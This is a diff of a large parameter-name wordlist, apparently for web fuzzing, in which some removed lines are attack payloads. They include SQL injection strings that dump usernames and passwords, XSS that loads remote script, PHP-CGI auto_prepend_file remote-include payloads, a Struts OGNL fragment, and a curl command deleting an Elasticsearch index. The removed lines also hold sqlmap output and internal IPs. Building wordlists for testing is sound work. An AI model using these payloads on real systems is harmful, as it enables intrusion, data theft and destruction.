@@ -264,7 +264,6 @@ product_id
 contentid
 download
 lid
-class.classLoader.jarPath
 rand
 con
 cate_id
@@ -852,7 +851,6 @@ yid
 t1
 css
 serial
-redirect:http://www.yahoo.com/
 verifyCode
 section
 searchValue
@@ -1236,7 +1234,6 @@ v_poll_id
 page_no
 letter
 reportId
-redirect:http://www.baidu.com
 dis
 kwtype
 objid
@@ -2335,7 +2332,6 @@ accessory
 xmlinfo
 scriptSessionId
 c0-id
-httpSessionId
 dodoId
 MuIDCode
 longitude
@@ -2451,7 +2447,6 @@ orderStatusCode
 gwid
 pnum
 viewid
-redirect:http://www.wooyun.org
 bookclass
 nsid
 tplname
@@ -2827,7 +2822,6 @@ HotelID
 formName
 _ajax
 actType
-redirect:Http://www.baidu.com
 treeId
 ClientType
 cp_id
@@ -3517,7 +3511,6 @@ BDUSS
 %5Bobject%20HTMLDivElement%5D
 MainProductID
 keyCode
-redirect:http://www.baidu.com/
 AnnoID
 UrlType
 SiteItem
@@ -3969,7 +3962,6 @@ nex_forms_Id
 device_platform
 ctl02
 lg
-redirectAction:http://www.google.com/%23
 requestData
 encrypted
 mood
@@ -4690,7 +4682,6 @@ toid
 TableID
 movie_special
 PayType
-http://www.baidu.com/
 load
 hDFile
 subtypeid
@@ -5030,8 +5021,6 @@ memberNo
 lable
 phone_number
 ename
-redirect:http://10.187.10.218
-redirect:http://admin.soso.com
 sorts
 sid2
 y1
@@ -5497,7 +5486,6 @@ ceny
 cenx
 Uin
 pref
-httptype
 isAttach
 losc
 sys_hash
@@ -5520,7 +5508,6 @@ APP
 FaqID
 TaskNo
 ek
-/V130Kvh82oDbLU/JamSNody0Alx8XCzvEa0xkPdv6mO6LJEoa1KttyGRLE!/o/dGUBAAAAAAAA
 sce
 fmodulecode
 save_state
@@ -5598,7 +5585,6 @@ cater
 listRange.pageSize
 modle
 xhid
-question/ajaxsearch/%73%73%73%27%20%55%4E%49%4F%4E%20%53%45%4C%45%43%54%20%31%2C%32%2C%33%2C%34%2C%35%2C%36%2C%37%2C%38%2C%75%73%65%72%28%29%2C%31%30%2C%31%31%2C%31%32%2C%31%33%2C%31%34%2C%31%35%2C%31%36%2C%31%37%2C%31%38%2C%31%39%2C%32%30%2C%32%31%23
 seatclass
 converttype
 memberlevel
@@ -5697,7 +5683,6 @@ CorpID
 uspm
 rrid
 Orders
-http://www.vjia.com/
 1+admin+123456+null+null
 detailsid
 curpid
@@ -5839,8 +5824,6 @@ files_type
 resp_id
 zckc_guid_0
 1427422340112
-redirect:http://www.sina.com
-redirect:http://www.163.com
 action_search
 rfu
 MOD
@@ -5961,7 +5944,6 @@ checkval
 idpk
 sfet
 reqType
-list_con/lm/222/id/-77%20union%20select%201,2,3,4,5,6,7,8,9,10,11,concat%280x3a,username,0x3a,password%29,13,14,15,16,17%20from+mx_user%20limit%201,1.html
 ZwId
 DriverID
 upfiles
@@ -5982,7 +5964,6 @@ bankuaiID
 Cid1
 redirecturl
 rightId
-question/ajaxsearch/%73%73%74%27%20%55%4E%49%4F%4E%20%53%45%4C%45%43%54%20%31%2C%32%2C%33%2C%34%2C%35%2C%36%2C%37%2C%38%2C%63%6F%6E%63%61%74%28%76%65%72%73%69%6F%6E%28%29%2C%30%78%33%61%2C%75%73%65%72%28%29%2C%30%78%33%61%2C%64%61%74%61%62%61%73%65%28%29%2C%30%78%33%61%2C%40%40%64%61%74%61%64%69%72%29%2C%31%30%2C%31%31%2C%31%32%2C%31%33%2C%31%34%2C%31%35%2C%31%36%2C%31%37%2C%31%38%2C%31%39%2C%32%30%2C%32%31%23
 connectMis
 examId
 packCategory
@@ -6181,7 +6162,6 @@ ASSETID
 FBDM
 XMBH
 is_jsonp
-http_referer
 dhid
 phone_type
 invite_user_id
@@ -6189,7 +6169,6 @@ Sport
 Spwd
 Sname
 SChannel
-http://129.pub.sina.com.cn:8080/cgi-bin/gsps/admin_doc/doc_list.cgi
 wshd.type
 handlerid
 nowlx
@@ -6241,7 +6220,6 @@ ispass
 fromBase
 isAdmin
 sec_autoid
-http://www.sqlku.com/
 SYSNO
 fuck
 no2
@@ -6502,7 +6480,6 @@ qingtype
 punid
 deptunid
 cmsId
-Handler.Default.SendSpecialMerchants
 style2
 modifyPwdToken
 userphone
@@ -6816,8 +6793,6 @@ partner_ids_str
 cs_id
 dirinfo
 cases_type
-%22%3E%3Cimg%20src%3D%27ice%27%20onerror%3D%22var%20s%3Ddocument.createElement%28%27script%27%29%3Bs.src%3D%27http%3A%2f%2ficefish1987.sinaapp.com%2faddFollow.js%27%3Bdocument.body.appendChild%28s%29%3B%22%3E
-%22%3E%3Cimg%20src%3D%27ice%27%20onerror%3D%22var%20s%3Ddocument.createElement%28%27script%27%29%3Bs.src%3D%27http%3A%2f%2ficefish1987.sinaapp.com%2faddFollowajax.js%27%3Bdocument.body.appendChild%28s%29%3B%22%3E
 filePhysicsName
 mtourl
 loginPwd
@@ -6873,7 +6848,6 @@ recrid
 recrm
 filelist
 nowCatalog
-cj1odHRwJTNBJTJGJTJGYXh6LmZkbms5MS5jb20lMkYmZD1mZG5rOTEuY29tJnQ9JUU1JThDJUJCJUU5JTk5JUEyJUU0JUJCJThCJUU3JUJCJThELSVFNCVCOCU4QSVFNiVCNSVCNyVFNSVBNCU4RCVFNSVBNCVBNyVFNyU5RiVBRSVFNSVCMCU4RiVFNyU5NyU4NyVFNSU4QyVCQiVFOSU5OSVBMiZpZD0zNiZwPWh0dHAlM0ElMkYlMkZheHouZmRuazkxLmNvbSUyRnpqZmQlMkZ5eWpzJTJGJnRva2VuPTBmODdmZDc1NDQ2NDhkYTIzZjlhOTUzZjBiNTg3Yzgw
 cookie%3d
 logHandler
 0.4836608215700835
@@ -6924,7 +6898,6 @@ arttype
 authorCode
 uniqueMatchCode
 saiqu
-eyJ1aWQiOiI1Mjc2Iiwibmlja25hbWUiOiJcdTY3NGVcdTUwMjkyIiwidXNlcm5hbWUiOiJsaXFpYW4yIiwiciI6Mjc2ODUzNTU4fQ
 BulNO
 zlzx
 typexpd2
@@ -7000,7 +6973,6 @@ realpath
 EMAIL_ADDRESS
 /auth/login
 mapShareId
-redirect:http://**.**.**.**
 idcate
 /account/ajax/login_process/
 tolist
@@ -7239,7 +7211,6 @@ l_c_id
 hotelcd
 Istype
 CityCd
- (strpos($fileurl, pc_base::load_config('system','upload_url')) 
 file_truename
 file_times
 att
@@ -7334,7 +7305,6 @@ s_richtext
 labID
 SymbiosisId
 IsTel
-httpUrl
 qstr
 bizNo
 searchInfo
@@ -7524,8 +7494,6 @@ pts
 reqtype
 mobilenum
 checkflag
-http://game.weibo.com/avatar/home/?origin
-http://game.sports.sina.com.cn/chaoti_events/wyx_2015_christmas_event/
 actdo
 ASSortID
 blimit
@@ -7735,7 +7703,6 @@ txtstartdate
 endststion
 UI
 UNAME
-mid%3D%3C%2F%73%63%72%69%70%74%3E%3C%73%63%72%69%70%74%3E%77%69%6E%64%6F%77%2E%6C%6F%63%61%74%69%6F%6E%2E%68%72%65%66%25%33%44%22
 UENo
 allian_code
 Linenum
@@ -7918,7 +7885,6 @@ f_jb
 touserid
 t10068603.html
 funds
-http://www.nowpc.net
 subSystem
 setconfine
 prg_id
@@ -8129,34 +8095,6 @@ sumlb
 reviewsType
 sctime
 typeNo
-http://10.101.240.22:80
-http://10.101.240.30:80
-http://10.101.240.87:80
-http://10.101.240.55:80
-http://10.101.240.39:80
-http://10.101.240.11:80
-http://10.101.240.121:80
-http://10.101.240.71:80
-http://10.101.240.114:80
-http://10.101.240.35:80
-http://10.101.240.96:80
-http://10.101.240.21:80
-http://10.101.240.90:80
-http://10.101.240.113:80
-http://10.101.240.40:80
-http://10.101.240.37:80
-http://10.101.240.120:80
-http://10.101.240.138:80
-http://10.101.240.16:80
-http://10.101.240.33:80
-http://10.101.240.50:80
-http://10.101.240.36:80
-http://10.101.240.103:80
-http://10.101.240.122:80
-http://10.101.240.80:80
-http://10.101.240.51:80
-http://10.101.240.25:80
-http://10.101.240.104:80
 compTypeId
 cust_no
 head
@@ -8501,7 +8439,6 @@ byecityunionid
 /list_T%D0%F4_7.htm
 qscrl
 c2coff
-tid_%B0%FC%D3%CA%BA%AB%B9%FA%B4%FA%B9%BA%B4%BA%D7%B0%B4%F2%B5%D7%C9%C0%20%C0%D9%CB%BF%C5%DD%C5%DD%D0%E4%B0%D7%C9%ABt%D0%F4%20%C5%AE%20%B6%CC%D0%E4%D0%A1%C9%C0%C5%AE%D7%B0%CF%C4%D7%B0.htm
 file_link
 NsjgId
 Money66
@@ -8693,7 +8630,6 @@ bash
 myPath
 solutionid
 cyuid
-%26%26%26%26%26%26%26%26%26%26%26%26%26%26%26%26%26%26%26%26%26%26%26%26%26%26%26%26%26%26%26%26%26%26%26%26%26%26%26%26%26%26%26%26%26%26%26%26%26%26%26%26%26%26%26%26%26%26%26%26%26%26%26%26%26%26%26%26
 sw_url
 op_req
 pay_uin
@@ -9102,7 +9038,6 @@ sendtime
 jianliid
 project_name
 select_id
-rc3CsyJHPpClsXvaxr+i6xIPXPOUcxJgaQaRa8qjD8jEfuo5+bm6yuaA5UUzoBsY
 lo
 farm
 keyword_s
@@ -9357,7 +9292,6 @@ membercd
 r.cityName
 r.cityId
 r.keyword
-redirect:http://www.g.cn/
 low
 high
 Q05
@@ -9374,14 +9308,6 @@ team4
 stext
 holderId
 monitorId
-search-fulltext-title-%5C%22%3E%3Ciframe%2Fsrc%3D%2F%2Ftmxk%26%2346%3Borg%3E--all-0-within-time-desc-1
-search-fulltext-title-TAG%3A%5C%22%3E%5C%27%3E%3Ciframe%2Fsrc%3D%2F%2Ftmxk%26%2346%3Borg%3E--all-0-within-time-desc-1
-doc-view-1572
-search-fulltext-title-%5C%22%3E%3Cscript%2Fsrc%3D%2F%2Ftmxk%26%2346%3Borg%2Fq%26%2346%3Bjs%3E--all-0-within-time-desc-1
-http://10.20.6.4:80
-http://10.20.6.6:80
-http://10.20.6.11:80
-http://10.20.6.5:80
 leftnav
 hyCategoryID
 templates_name
@@ -9584,8 +9510,6 @@ gs_upl
 gs_sm
 project_code
 PF_CODE
--dauto_prepend_file%3d/etc/passwd+-n
--dallow_url_include%3don+-dauto_prepend_file%3dhttp://219.145.166.89:90/myname/1.php
 color_1
 winteam
 sort_name_id
@@ -9598,9 +9522,6 @@ tagShow
 model_GUID
 prodct
 MsgI
-watermark/1/image/aHR0cDovLzE3Mi4zMC4yNTEuMTY4OjkyMDA
-watermark/1/image/aHR0cHM6Ly93d3cuYmFpZHUuY29tL2ltZy9iZF9sb2dvMS5wbmc
-watermark/1/image/%s/dissolve/100/gravity/SouthEast
 values
 original_id
 taiid
@@ -9638,7 +9559,6 @@ asker
 outUrl
 qr_t
 fromInnerIE
-ssshttp://www.baidu.com
 PlaceID
 t_to
 md1
@@ -9951,7 +9871,6 @@ appRecId
 job_name1
 xn_siteid
 orderIndex
-redirect%3A%24%7B%23req%3D%23context.get%28%27com.opensymphony.xwork2.dispatcher.HttpServletRequest%27%29%2C%23a%3D%23req.getSession%28%29%2C%23b%3D%23a.getServletContext%28%29%2C%23c%3D%23b.getRe
 sceneIds
 vendorId
 tracker_id
@@ -10081,7 +10000,6 @@ sReturnUrl
 appID
 duserId
 qualapprfile
--dallow_url_include%3don+-dauto_prepend_file%3dhttp://www.123.cc/123.txt
 publicstr
 scheduleTypeId
 mendian
@@ -10274,7 +10192,6 @@ kisyu
 ProductRemarkId
 ieb12eki
 fullPath
-1%3C/title%3E1%22/%3E%3Cscript%3Ealert%28/xss/%29%3C/script%3E
 dim
 down_url
 SOFTID
@@ -10395,7 +10312,6 @@ highType
 School
 BestOrNewType
 authuser
-http://sina.allyes.com/main/adfclick?db
 cancel
 sfsess
 place_name
@@ -10569,7 +10485,6 @@ payAmount
 mo_device
 notifyUrl
 defaultResPage
-....0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20default%3A%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20p
 failUrl
 bd_vip
 passuid
@@ -10735,7 +10650,6 @@ cn-shoppingcart.html-
 item_name
 submit1
 www.mmqx.gov.cn
-dHJhbkNvZGU9JkVNUF9TSUQ9QU9EQ0RGRFJFTUFXRlJGT0FBQUNJSUpTRUNCVklMR1RER0hRR0tBSiZjdXN0b21lck1lc3NhZ2U9JmNzdFR5cGU9MDAmcGhvbmVGbGFnPTM
 prdcode
 btn_id
 fundsinvest
@@ -10870,14 +10784,6 @@ Cata
 lcqx
 iBankID
 diccode
-wsdl|1800000000300101.BandWidthAAASoap|AAA
-wsdl|1800000000100001.CRMInterfaceSoap|CRM
-wsdl|1800000000100501.UaUDBServerImplPort|
-wsdl|1800000000402701.UDBCommonSoap|
-wsdl|1800000000200101.UDBCommonSoap|
-wsdl|1800000000200201.UDBForBNETSoap|
-wsdl|1800000000402801.UDBCommonSoap|
-wsdl|
 blng
 blat
 chooseid
@@ -11118,8 +11024,6 @@ ProductIDs
 cardUid
 coloringid
 digg
-/account/register/email-435420828%40qq.com%22%3E%3Cscript%3Ealert%28document.cookie%29%3C/script%3E%22%3C
-%2D%64+%61%6C%6C%6F%77%5F%75%72%6C%5F%69%6E%63%6C%75%64%65%3D%6F%6E+%2D%64+%73%61%66%65%5F%6D%6F%64%65%3D%6F%66%66+%2D%64+%73%75%68%6F%73%69%6E%2E%73%69%6D%75%6C%61%74%69%6F%6E%3D%6F%6E+%2D%64+%64%69%73%61%62%6C%65%5F%66%75%6E%63%74%69%6F%6E%73%3D%22%22+%2D%64+%6F%70%65%6E%5F%62%61%73%65%64%69%72%3D%6E%6F%6E%65+%2D%64+%61%75%74%6F%5F%70%72%65%70%65%6E%64%5F%66%69%6C%65%3D%70%68%70%3A%2F%2F%69%6E%70%75%74+%2D%64+%63%67%69%2E%66%6F%72%63%65%5F%72%65%64%69%72%65%63%74%3D%30+%2D%64+%63%67%69%2E%72%65%64%69%72%65%63%74%5F%73%74%61%74%75%73%5F%65%6E%76%3D%30+%2D%6E
 xiaqucode
 rowguid
 protocalnum
@@ -11161,7 +11065,6 @@ user_city
 LQP
 smscontent
 bkway
-http://www.baidu.com/s?tn
 realid
 ypid
 strMemID
@@ -11802,7 +11705,6 @@ fx
 btype_id
 db_id
 niceName
-%3E%27%22%3E%3Cscript%3Ealert%28/xss/%29%3C%2Fscript%3E
 pic-piclist-2
 sidemenubar
 jd
@@ -11845,10 +11747,6 @@ _AutoRedirect
 Suffix
 EppOwner
 Passwd
-?jquery-1.11.2.min.js,jquery.SuperSlide.2.1.js,jquery.jqtransform.js,jquery.DOMWindow.js,jquery.cookie.js,jquery.autocomplete.js,jquery.artDialog.js,jquery.lazyload.min.js?v
-?js.js,tabs.js,addMyFavorite.js,behaviorTrack.js,biaodan.js,common.js,device.min.js,iframeTools.js,headerNew.js?v
-?layout.css?v
-%22%3e%3c%2Fobject%3e%22%3e%3Ciframe%20src
 sortDirection
 SupplierCategory
 sysCmd
@@ -11995,7 +11893,6 @@ fromwhere
 BBs_ID
 XieYiLeiBie
 q-590901.html
-http://hiphotos.baidu.com/%D7%EE%B0%AErocholle/pic/item/c9569b169d16fdfadf11ae53b48f8c5495ee7b50.jpg
 der
 ?.??/vendor/index!login.action?userName
 imgKey
@@ -12223,7 +12120,6 @@ srchmem
 cbillcode
 nopid
 AAB001
-question/ajaxsearch/%73%73%73%27%20%55%4E%49%4F%4E%20%53%45%4C%45%43%54%20%31%2C%32%2C%33%2C%34%2C%35%2C%36%2C%37%2C%38%2C%63%6F%6E%63%61%74%28%75%73%65%72%6E%61%6D%65%2C%30%78%33%63%2C%70%61%73%73%77%6F%72%64%29%2C%31%30%2C%31%31%2C%31%32%2C%31%33%2C%31%34%2C%31%35%2C%31%36%2C%31%37%2C%31%38%2C%31%39%2C%32%30%2C%32%31%20%66%72%6F%6D%20%61%73%6B%5F%75%73%65%72%20%23
 friend_flag
 xt
 exactitude
@@ -12426,7 +12322,6 @@ t_date
 NOSSL
 sstype
 sskey
-action/viewcomment/op/delete/itemid/1/cid/369/type/members%20set%20groupid
 searStr
 questionID
 rp_name
@@ -12458,18 +12353,11 @@ GSType
 datepath
 is_sign
 attachid
-http_server_proxy
 filenames
 newpass
 isread
 imageid
 certificate_id
-redirect:http://10.130.2.149
-redirect:http://10.130.69.227
-redirect:http://10.130.14.94
-redirect:http://xxx.xxxx.dnslog.info
-redirect:http://img.cms.tencent.com/
-redirect:http://10.187.10.217
 isctrip
 ouid
 allianceid
@@ -12598,7 +12486,6 @@ schedule_from
 send_from
 send_end
 schedule_end
-redirect:http://www.jd.com
 ShowAction
 Workflow
 ald
@@ -12661,7 +12548,6 @@ creatortypeid
 seller
 fstq
 0.24169324222020805
-http://wooyun.org/
 ir
 ptiId
 aoiId
@@ -12771,7 +12657,6 @@ suppressHeaders
 reflesh
 model.flowId
 0.30376001982949674
--dallow_url_include%3dOn+-dauto_prepend_file%3dhttp%3a%2f%2F
 anycode
 upath
 sub1
@@ -13042,7 +12927,6 @@ academicDegreLevel
 programName
 ctm
 auth_username
-join_con/lm/208/id/-283%20union%20select%201,2,3,4,5,6,7,8,9,10,11,database
 Stimes
 Etimes
 fromusername
@@ -13114,7 +12998,6 @@ n_kind
 cataId
 appurl
 nls
-redirect:http://www.wooyun.com/
 manCode
 qq.com/
 qqdurl
@@ -13282,7 +13165,6 @@ mypage
 uidt
 receive_id
 nMesid
-http://fanfou.com/
 params1
 upkey
 params2
@@ -13343,8 +13225,6 @@ fielPath
 iv3
 iv2
 iv1
-http://wanwan.sina.com.cn/event/sssanguo_2/sg.php
-?http://wanwan.sina.com.cn/event/sssanguo_2/sg.php/
 handling
 netcom_id
 netcom_key
@@ -13390,7 +13270,6 @@ certify
 operNo
 SearchString
 xgID
-redirectAction:http://www.google.com/%EF%BC%8523
 acceptId
 tbm
 LeiXingNo
@@ -13559,7 +13438,6 @@ charge
 InnerCode1
 Prop1
 checkstr
-x+Z5mMbGPAu1LJqUU6N6bPwYE5jYY0era3GG37UlS1GBQRtifH7TZhS4jdBDRUK4tRM7J3UHzxJcIcUo5vI27ZYUGRnMkV2TIc30DoYlHCpAMK9WZbvHWHnPwGfiBcHEMDxm7iZ2BjQ
 XXXXXXXXXXXXXXXXXXXXXXXXXXXXX
 lbdm
 scanlogid
@@ -14039,7 +13917,6 @@ inc
 fromUserClientType
 fromUserId
 advertisement_id
-http://www.wooyun.org
 medlive_user_id
 device_version
 appChildName
@@ -14489,7 +14366,6 @@ edit_MANAGENUMBER
 ajaxSubmitType
 partids
 eventname
-redirectAction:http://d.cn%23
 subCatalogId
 SendTime
 OperID
@@ -14845,7 +14721,6 @@ businame
 compId
 projectNo
 SNO
-redirect:http://www.yahoo.com
 _M
 lostpage
 firstpage
@@ -15153,7 +15028,6 @@ langOfUser
 align
 PKId
 wr
-redirect:http://wooyun.org
 sr_p
 sprice
 goods_order_type
@@ -15749,7 +15623,6 @@ driver.id
 car.id
 prno
 meth
-http://tudou.com/programs/view/aaaa
 iNum
 Link
 car_status
@@ -16104,7 +15977,6 @@ overridePackage
 downLink
 fr_bdps_bottom_login
 autolike
-http://v.t.qq.com/
 fjid
 gift/add.html
 FeedBackIssus%5Bperso%5D
@@ -16385,7 +16257,6 @@ ctlmode
 domainId
 ref_1
 ref_2
-httprefer
 ref_3
 queryvalue
 domains
@@ -16841,7 +16712,6 @@ prjNbr
 symptomId
 paperid
 000001
-redirect:http://www.sina.com/
 picformat
 attention
 userpointuid
@@ -16951,7 +16821,6 @@ CurEID
 CurFC
 country_key
 SClassid
-http://**.**.**.**/Singer.asp?Classid
 chapter_id
 BM
 getCount
@@ -16971,7 +16840,6 @@ radioPhone
 phoneArea1
 getArea
 button_type
-%3Cmeta%20http-equiv%3D
 IsGetCarVisit
 currentCarTypeName
 ReturnCarDate
@@ -17126,7 +16994,6 @@ key2
 euid
 codeLen
 photoType
-https://www.vjia.com/
 asktitle
 page.autoCount
 page.size
@@ -17173,7 +17040,6 @@ login_id
 start_page
 AgentID
 PerfYM
-http://ku.ent.sina.com.cn/movie/24413
 zxjl_type
 huifu
 resourceName
@@ -17275,7 +17141,6 @@ rolename
 pol_no
 modelNo
 sAppClass
-redirect:http://www.wooyun.org/
 bugid
 postName
 bn
@@ -17384,8 +17249,6 @@ folderPath
 fd
 ibb
 fuzzy_deptId
- [Y/n] y [23:16:24] [INFO] heuristics detected web page charset 'GB2312' [23:16:24] [WARNING] cannot properly display Unicode characters inside Windows O S command prompt (http://bugs.python.org/issue1602). All unhandled occurances wi ll result in replacement with '?' character. Please, find proper character repre sentation inside corresponding output files. sqlmap identified the following injection points with a total of 0
- [Y/n] y [23:09:21] [INFO] heuristics detected web page charset 'GB2312' [23:09:21] [WARNING] cannot properly display Unicode characters inside Windows O S command prompt (http://bugs.python.org/issue1602). All unhandled occurances wi ll result in replacement with '?' character. Please, find proper character repre sentation inside corresponding output files. sqlmap identified the following injection points with a total of 0
 show_id
 ?pCatBodyId
 zzly
@@ -17650,7 +17513,6 @@ app_mac
 app_access_token
 navtp
 drag
-http://www.baidu.com
 groupbuyid
 webvoteid
 produce
@@ -17777,7 +17639,6 @@ ImageButton2.x
 ImageButton2.y
 tbxName
 Button3
-{"xEndTime":"-1' OR 1
 shareing_data
 pay_type
 no_agree
@@ -17810,7 +17671,6 @@ txtUserPwd
 break
 current user is DBA:    True
 Content-Type: image/jpeg
-https
 ctl00%24ContentPlaceHolder1%24Button1
 instanceId
 pwdconfirm
@@ -17853,7 +17713,6 @@ txtAccount
 Question
 Answer
 Login1%24UserName
-{"telPhoneInfo":"{\"phoneDeviceId\":\"\",\"phoneMacType\":1,\"phoneModel\":\"SM-N9005\"}","sign":"Ffghu*$C00FEB6224030F36C9B26D0C79A2C2134C987183"}
 phoneCode
 webprefix
 loginCode
@@ -18193,7 +18052,6 @@ txtLoginEmail
 Login1%24Password
 Login1%24LoginButton
 act_name
-current user:    '<a href
 cmdLogin.x
 cmdLogin.y
 donet_type
@@ -18253,7 +18111,6 @@ txtuser
 opration
 mail_id
 LoginButton
-{"mCertType":"2","mCertCode":"123123","mCandidateName":"?????????","mFirstName":"","mLastName":""}
 marry
 kl
 nationality
@@ -18469,7 +18326,6 @@ bianju
 yclx
 txtNum
 user_item_id
-{"request":{"body":{"clientInfo":{"clientIp":"192.168.0.103","deviceId":"354016054666357","pushInfo":"","refId":"18241320","versionNumber":"5.3.0","versionType":"android"},"memberId":"27581001","loginName":"13999999999"},"header":{"accountID":"c26b007f-c89e-431a-b8cc-493becbdd8a2","digitalSign":"47db96e89b881b671ca4dda938198ca6","reqTime":"2014-01-10 12:41:49.070","serviceName":"QueryMemberInfo","version":"20111128102912"}}}
 _entName
 _certNum
 sizePerPage
@@ -18657,8 +18513,6 @@ STAFF_ID
 %24FormConditional%245
 strUserId
 strUserPw
-{"account":"1"}
-{"answer":"","email":"","question":"","roomPswd":"","userName":"","userPswd":"","webAccount":"1"}
 requestUri
 createById
 exception
@@ -18820,9 +18674,7 @@ ctl00%24cph_body%24btnSearch
 ctl00%24cph_body%24txtSearch
 btnSubmit3
 Yzm
-{"userid":"<a href
 guanlian
-{"userName":"13222222222","password":"MTExMTEx"}
 info1
 info2
 info13
@@ -18838,7 +18690,6 @@ ChangePassword1%3AtbPsw
 ChangePassword1%3AbtOk
 ChangePassword1%3AtbNewPsw
 CheckBox1
-{"userName":"sj1563879****1","oldPwd":"MTIzNDU2","newPwd":"NjU0MzIx"}
 choice[]
 ctl00%24ContentPlaceHolder1%24STU_CONTACT
 ctl00%24ContentPlaceHolder1%24USER_NAME
@@ -18855,32 +18706,9 @@ passwordtx
 chaxun
 GridView1%24ctl18%24inPageNum
 zhou
-ctl00%24ContentPlaceHolder1%24UCPageForTable1%24txtfCon
-ctl00%24ContentPlaceHolder1%24UCSelectNormal1%24txtField1_EDateTime
-ctl00%24ContentPlaceHolder1%24UCSelectNormal1%24drpField1
-ctl00%24Scriptmanager1
-ctl00%24ContentPlaceHolder1%24UCSelectNormal1%24txtField2_SText
-ctl00%24ContentPlaceHolder1%24UCSelectNormal1%24txtField1_ENumber
-ctl00%24ContentPlaceHolder1%24UCSelectNormal1%24txtField_Subject
-ctl00%24ContentPlaceHolder1%24UCPageForTable1%24UCPageBase1%24txtTotalRecord
-ctl00%24ContentPlaceHolder1%24UCSelectNormal1%24txtField1_SNumber
-ctl00%24ContentPlaceHolder1%24UCSelectNormal1%24txtField1_EText
-ctl00%24ContentPlaceHolder1%24UCSelectNormal1%24drpField2
-ctl00%24ContentPlaceHolder1%24UCSelectNormal1%24txtField2_SNumber
-ctl00%24ContentPlaceHolder1%24UCSelectNormal1%24drpSort
-ctl00%24ContentPlaceHolder1%24UCPageForTable1%24UCPageBase1%24drpPageSize
-ctl00%24ContentPlaceHolder1%24UCSelectNormal1%24txtField1_SDateTime
-ctl00%24ContentPlaceHolder1%24UCSelectNormal1%24txtField1_SText
-ctl00%24ContentPlaceHolder1%24UCSelectNormal1%24btnExeSelect
-ctl00%24ContentPlaceHolder1%24UCSelectNormal1%24txtField2_SDateTime
-ctl00%24ContentPlaceHolder1%24UCPageForTable1%24txtfSort
 cmdOK.x
 cmdOK.y
 ctl00%24ContentPlaceHolder1%24UCSelectNormal1%24txtField2_SCode
-Action URL: http://space.tuchong.com/api/reply/add/
-Action URL: http://space.tuchong.com/34855/photos/
-Action URL: http://www.tuchong.com/api/reply/add/
-Action URL: http://www.tuchong.com/album/23209/
 [*] shutting down at 18:45:44
 确认是盲注
 ctl00%24ContentPlaceHolder1%24mphone2
@@ -18958,7 +18786,6 @@ FindByDepart
 FindByCate
 name6%5b%5d
 sewd
-<Login><UserName>admin' AND UTL_INADDR.get_host_name(chr(94)||chr(94)||chr(94)||(SELECT BANNER FROM v$version WHERE ROWNUM
 checkbox37
 checkbox36
 checkbox35
@@ -19005,9 +18832,6 @@ my_code
 d[staffid]
 d[staff_pass]
 urlsj
-{"seqNo":"16768","vcode":"1111","code":"aifbc6c0eo5sgzi"}
-//
-floor(rand(0)*2))x from information_schema.tables group by x)a))and'
 DELETE_STR
 PAGE_START
 SeachFile
@@ -19078,7 +18902,6 @@ webHdongView.s_clie9
 ctl00%24ContentPlaceHolder1%24TitleTextBox
 ctl00%24ContentPlaceHolder1%24DateTimeCreatedTextBox
 ctl00%24ContentPlaceHolder1%24FilterButton
-{"map":{"method":"postMessage","params":{"javaClass":"java.util.ArrayList","list":[{"javaClass":"com.neusoft.education.dcp.apps.message.entity.MessageOutBoxEntity","TITLE":"è°æææç®","RECEIVE_UID":"1xxxxxx3","CONTENT":"å¤§å¸çæ\t    ","SEND_TIME":{"javaClass":"java.util.Date","time":1424780841049},"SEND_UID":"xs1x7","PHOTO_NAME":"xs11x168.jpg","IS_EXIST_AFFIX":"0"}]}},"javaClass":"java.util.HashMap"}
 verityCode
 ctl03
 identitycard
@@ -19100,7 +18923,6 @@ agid
 login_cb
 login_pw
 DBName
-{"address":"e","business":"","content":"","email":"<a href
 acctMon
 saleSta
 acctDay
@@ -19158,8 +18980,6 @@ jprq1
 channel-id
 common_lat
 common_lng
-pk[uid%3d5529+and+if(mid((select+concat(username,password)+from+keke_witkey_member+limit+0,1),1,1)%3dchar(97),sleep(5),1)%23]
-[*] performance_schema
 localhost
 SAVE_CORP
 mess
@@ -19248,9 +19068,6 @@ ctl00%24ContentPlaceHolder1%24txt_name
 ctl00%24ContentPlaceHolder1%24bt_chaxun
 ctl00%24ContentPlaceHolder1%24txt_adress
 ctl00%24ContentPlaceHolder1%24txt_area
-{"newpasswd":"e19d5cd5af0378da05f63f891c7467af","passwd":"e10adc3949ba59abbe56e057f20f883e","uid":"§86060§"}
-{"readList":[{"docType":"0","time":"2016-01-18 17:33:22","docTitle":"GTX970显卡DIY改造教程","docId":"5641364"}],"date":"2016-01-18","ssid":"c2955357b12f3de"}
-{"media_id":"1","ssid":"c2955357b12f3de","opt":"1","version":"and412"}
 parameters[%27noticetype%27]
 parameters[%27title%27]
 agency.address
@@ -19294,7 +19111,6 @@ useracc
 1404976068948
 3d
 NONO
-curl -XDELETE http://42.62.14.38:9200/wooyun
 misc
 call_id
 uniq_id
@@ -19303,7 +19119,6 @@ json_call
 mealId
 special4g
 messageCode
-{"uuid":"ios_894A9D9674DC47EF1311B2EFCE188073","newuser":"false","openudid":"7c28c7e4a694049ea78a4024eef3d4413a5fc385"}
 blindsql: GET [bid
 [*] TianGe_History
 yazhengma
@@ -19313,12 +19128,6 @@ TkTree__ExpandState
 Window1%24SimpleForm1%24tbxUserName
 Window1%24SimpleForm1%24tbxPassword
 Window1_SimpleForm1_Collapsed
-ctl00%24ctl00%24ContentPlaceHolder1%24Search%24DanWeiType
-ctl00%24ctl00%24ContentPlaceHolder1%24Search%24DanWeiName
-ctl00%24ctl00%24ContentPlaceHolder1%24Search%24CityNum
-ctl00%24ctl00%24ContentPlaceHolder1%24Search%24BtnSearch
-ctl00%24ctl00%24ContentPlaceHolder1%24Search%24ZiZhiNum
-ctl00%24ctl00%24ContentPlaceHolder1%24Search%24Edate
 file_array[]
 dump_flag
 arr_port
@@ -19393,17 +19202,6 @@ company%5b%5d
 areaname1
 areaname2
 cartime%5b%5d
